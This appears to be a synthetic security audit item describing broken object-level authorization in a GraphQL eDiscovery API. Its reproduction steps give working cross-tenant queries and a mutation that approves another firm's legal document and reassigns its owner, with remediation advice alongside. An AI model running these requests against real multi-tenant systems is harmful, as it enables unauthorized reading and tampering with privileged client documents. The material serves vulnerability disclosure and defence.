## System

- System: LexVault eDiscovery API v3.6.8
- Domain: LEGAL TECH / DOCUMENT MANAGEMENT
- Example ID: GQL-0024
- Risk ID: RISK-GQL-024

## Findings

### 1. Cross-Tenant Write on Legal Document — `updateResource` Status Approval Without Ownership Check (Pattern 1.2 / HAR Primary)

**Primary HAR attack**: The HAR shows `updateResource(id: "R-2024", input: {status: "approved", ownerId: "attacker-b7cb8cc3"})` from JWT `tenant-b7cb`. The `updateResource` resolver shares the same missing ownership check as `getResource` (RISK-GQL-024), allowing write operations on cross-tenant legal document resources.

**HAR evidence**: JWT `x-tenant-id: tenant-b7cb`. Request: `updateResource(id: "R-2024", input: {status: "approved", ownerId: "attacker-b7cb8cc3"})`. Response: HTTP 200 OK with `"tenantId": "tenant-8cc3"` — a legal document belonging to another law firm or client approved and ownership transferred by an unauthorized party.

**Legal Tech/eDiscovery impact**: `Resource` objects in an eDiscovery platform represent case files, contracts, legal memos, or evidence items. `updateResource(status: "approved")` on another firm's document could approve evidence for submission, mark a privileged document as non-privileged, or tamper with document review status — potentially affecting litigation outcomes and violating attorney-client privilege.

### 2. Pattern 1.2 — Related/Linked Resources via `getResourceWithChildren`

Pattern 1.2 describes BOLA on related/linked resources. The `items: [Item!]` relationship and `getResourceWithChildren` query expose linked sub-documents, annotations, and attachments without per-item ownership checks. An attacker who can read the parent document (via RISK-GQL-024) can traverse to all linked child items — including confidential attachments and annotations belonging to the same cross-tenant case.

### 3. BOLA on `getResource` — Missing `tenant_id` Filter (RISK-GQL-024)

Section 4.0 (RISK-GQL-024): `getResource` fetches by `resourceId` without tenant check.

### 4. BOLA on `bulkResourceLookup` — No Per-ID Ownership Filter

Section 4.0: documented gap.

### 5. Redis Cache Without Tenant Dimension

Section 2.0: `resourceId`-only cache key. Legal documents cached without tenant dimension could serve privileged attorney-client materials cross-firm.

## Evidence

- **HAR**: `updateResource(id: "R-2024", input: {status: "approved", ownerId: "attacker-b7cb8cc3"})` with `tenant-b7cb` JWT → HTTP 200 with `tenantId: tenant-8cc3`.
- **Section 5.0**: Pattern 1.2 — related/linked resources accessible without ownership checks.
- **Section 4.0 (RISK-GQL-024)**: `getResource` lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` lacks per-ID filter.
- **Section 2.0**: Redis cache keyed by `resourceId` only.

## Reproduction

**Step 1 — Baseline:**

```graphql
query { getResource(id: "R-1024") { resourceId tenantId data { sensitiveField } } }
```

Expected: `tenantId: "tenant-b7cb"`.

**Step 2 — Cross-tenant write — tamper with legal document status (primary HAR attack):**

```graphql
mutation {
  updateResource(id: "R-2024", input: {
    status: "approved",
    ownerId: "attacker-b7cb8cc3"
  }) {
    resourceId status tenantId ownerId
  }
}
```

Expected secure: Mutation rejected — foreign firm's document access blocked.  
Expected vulnerable: HTTP 200 — another law firm's case document approved and ownership transferred.

**Step 3 — Related/linked resource traversal via `getResourceWithChildren` (Pattern 1.2):**

```graphql
query {
  getResourceWithChildren(id: "R-2024") {
    resourceId tenantId
    data { sensitiveField internalNotes auditLog { event timestamp actor } }
    items {
      itemId
      data { sensitiveField internalNotes }
    }
  }
}
```

Expected secure: Null or authorization error.  
Expected vulnerable: Full document tree for `tenant-8cc3` — parent document + all linked child items (attachments, annotations, evidence sub-documents).

**Step 4 — Single cross-tenant document read (RISK-GQL-024):**

```graphql
query { getResource(id: "R-2024") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }
```

**Step 5 — Bulk cross-tenant document lookup:**

```graphql
mutation { bulkResourceLookup(ids: ["R-2024", "R-3024", "R-4024"]) { resourceId tenantId data { sensitiveField } } }
```

## Remediation

- **Enforce `tenant_id` WHERE clause in all resolvers** (RISK-GQL-024).
- **Enforce cross-tenant check before `updateResource`**.
- **Re-validate ownership at each level in `getResourceWithChildren`**: child `Item` resolvers must check `WHERE tenant_id = jwt.tenantId` independently.
- **Filter `bulkResourceLookup` by JWT `tenantId`**.
- **Add `tenantId` to Redis cache key**.
- **Attorney-client privilege flag**: documents marked as privileged must require additional role check beyond `tenantId` membership.
